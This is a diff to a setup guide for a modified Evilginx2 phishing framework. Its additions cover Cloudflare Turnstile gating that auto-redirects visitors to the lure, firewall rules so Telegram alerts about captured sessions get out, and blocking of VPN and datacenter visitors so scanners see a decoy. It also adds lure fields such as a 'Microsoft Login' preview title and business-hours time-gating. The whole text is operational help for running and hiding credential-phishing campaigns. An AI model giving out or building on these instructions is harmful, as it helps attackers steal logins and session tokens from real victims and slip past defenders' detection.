@@ -178,7 +178,7 @@ A wildcard cert covers all subdomains (`*.yoursite.com`) and keeps them hidden f
 ## Request the certificate
 
 ```bash
-certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d yoursite.com
+certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d 'yoursite.com'
 ```
 
 Follow the prompts:
@@ -738,15 +738,46 @@ ExecStart=/root/evilginx2/evilginx2 \
 
 Reload: `systemctl daemon-reload && systemctl restart evilginx`
 
+Or set the keys live from the Evilginx terminal (no restart needed):
+
+```
+config turnstile SITEKEY:SECRETKEY
+config turnstile off
+```
+
 Turnstile also works on redirect pages — set the `on` flag when adding a redirect page (see Part 13).
 
+**Turnstile widget placement:** The challenge widget position is controlled by the HTML in `redirectors/turnstile/index.html`. Move the `<div id="cf-turnstile">` element to wherever you want the widget to appear on the page. The widget auto-solves (invisible mode) and immediately redirects the visitor to the lure URL — no button click needed.
+
+**Note on the Telegram i/o timeout:** If Telegram notifications fail with `dial tcp 149.154.166.110:443: i/o timeout`, your VPS outbound to Telegram's API is being blocked. Fix:
+
+```bash
+# Allow Telegram's IP range outbound
+ufw allow out to 149.154.160.0/20
+ufw allow out to 91.108.4.0/22
+ufw allow out to 91.108.56.0/22
+ufw reload
+
+# Test:
+curl -s --max-time 10 "https://api.telegram.org/botYOUR_TOKEN/getMe"
+```
+
 ## Block VPN visitors
+
+Enable at startup via flag:
 
 ```ini
 ExecStart=... -block-vpn
 ```
 
-Requires GeoIP database.
+Or toggle live from the Evilginx terminal without restarting:
+
+```
+config blockvpn on
+config blockvpn off
+```
+
+Both require GeoIP database. When enabled, any visitor whose IP resolves as a VPN, proxy, or datacenter is served the `unauth_url` instead of the phishing page.
 
 ## Block specific countries
 
@@ -810,6 +841,8 @@ Restart evilginx after editing `blacklist.txt` — the file is loaded at startup
 | `config autocert on/off` | Enable/disable automatic SSL (needed to load wildcard cert) |
 | `config unauth_url <url>` | Redirect unauthorized visitors here |
 | `config strip_headers on/off` | Remove Evilginx fingerprints from responses |
+| `config blockvpn on/off` | Block visitors detected as VPN/proxy/datacenter (requires GeoIP) |
+| `config turnstile <sitekey:secretkey>` | Enable Cloudflare Turnstile CAPTCHA (use `off` to disable) |
 | `config teletoken <token>` | Telegram bot token |
 | `config chatid <id>` | Telegram chat ID |
 | `config dashboardsub <sub>` | Set dashboard HTTPS subdomain (e.g. `panel`) |
@@ -862,9 +895,37 @@ redirects add landing loading.html on
 | `lures list` | List all lures |
 | `lures clone <index>` | Duplicate a lure with all its settings and a new random path |
 | `lures delete <index>` | Delete a lure |
-| `lures edit <index> <field> <value>` | Edit lure settings (path, hostname, redirect_url, info, og_title, og_desc, og_image, og_url, ua_filter, redirector) |
+| `lures edit <index> <field> <value>` | Edit lure settings (see fields below) |
 | `lures pause <index> <duration>` | Pause a lure (e.g. `1h`, `30m`) |
 | `lures unpause <index>` | Unpause a lure |
+
+**`lures edit` fields:**
+
+| Field | Example value | Description |
+|-------|--------------|-------------|
+| `path` | `/AbCdEfGh` | URL path for the lure |
+| `hostname` | `login.yoursite.com` | Custom subdomain for this lure |
+| `redirect_url` | `https://microsoft.com` | Where to send victim after capture |
+| `ua_filter` | `Mobile` | Regex; only allow matching User-Agents |
+| `redirector` | `turnstile` | Pre-phishing redirector directory name |
+| `active_hours` | `08:00-18:00` | Only serve lure between these hours |
+| `active_days` | `Mon,Tue,Wed,Thu,Fri` | Only serve lure on these days |
+| `active_tz` | `America/New_York` | IANA timezone for active_hours/active_days |
+| `info` | `Campaign A` | Internal label (not visible to victims) |
+| `og_title` | `Microsoft Login` | OpenGraph title for link previews |
+| `og_desc` | `Sign in to...` | OpenGraph description |
+| `og_image` | `https://...` | OpenGraph image URL |
+| `og_url` | `https://...` | OpenGraph canonical URL |
+
+**Time-gated lures example (Mon–Fri business hours, US Eastern):**
+
+```
+lures edit 0 active_hours 08:00-18:00
+lures edit 0 active_days Mon,Tue,Wed,Thu,Fri
+lures edit 0 active_tz America/New_York
+```
+
+Outside the configured window, the lure path returns a 404 / `unauth_url`. Clear a field by passing an empty string: `lures edit 0 active_hours ""`
 
 ## Autolure commands
 
